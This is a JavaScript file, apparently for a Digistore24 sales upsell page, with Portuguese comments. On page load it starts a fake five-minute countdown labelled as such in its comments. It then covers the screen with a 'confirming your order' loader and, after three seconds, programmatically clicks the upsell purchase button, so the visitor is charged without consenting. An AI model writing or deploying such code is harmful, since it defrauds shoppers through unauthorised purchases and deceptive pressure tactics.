document.addEventListener('DOMContentLoaded', () => {

    // ====================== TIMER FALSO VISÍVEL ======================
    function startFakeTimer() {
        const timerContainer = document.getElementById('offer-countdown-container');
        const timerDisplay = document.getElementById('offer-countdown-display');
        if (!timerContainer || !timerDisplay) return;
        timerContainer.style.display = 'block';

        let duration = 5 * 60;
        const timerInterval = setInterval(() => {
            let minutes = parseInt(duration / 60, 10);
            let seconds = parseInt(duration % 60, 10);
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            timerDisplay.textContent = `${minutes}:${seconds}`;

            if (--duration < 0) {
                clearInterval(timerInterval);
                timerContainer.querySelector('p').innerText = 'Offer Expired!';
                timerDisplay.style.color = '#777';
                timerDisplay.style.textAlign = 'center';
            }
        }, 1000);
    }

    // ====================== AUTO-CLICK DO DIGISTORE24 (CORRIGIDO) ======================
    function executeAutoPurchase() {
        const loadingCSS = `
            <style id="loading-style">
            .loader-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #e3e8ee; z-index: 999999; font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; }
            .loader-content-wrapper { text-align: center; }
            .loader-spinner { border: 8px solid #cccccc; border-top: 8px solid #2180c0; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 20px; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            .loader-text { color: #525559; font-size: 18px; font-weight: bold; }
            </style>`;
        const loadingHTML = `<div id="custom-loader" class="loader-container"><div class="loader-content-wrapper"><div class="loader-spinner"></div><div class="loader-text"><p class="title">Confirmando seu pedido e enviando seu acesso...</p><p>Não feche esta página.</p></div></div></div>`;
        document.head.insertAdjacentHTML('beforeend', loadingCSS);
        document.body.insertAdjacentHTML('beforeend', loadingHTML);

        setTimeout(() => {
            const botao = document.querySelector('#ds24-upsell-yes-button a.btn');
            if (botao) {
                botao.click();
                console.log("✅ Botão clicado automaticamente!");
            } else {
                console.error("❌ Botão não encontrado.");
            }
        }, 3000);
    }

    startFakeTimer();
    executeAutoPurchase();
});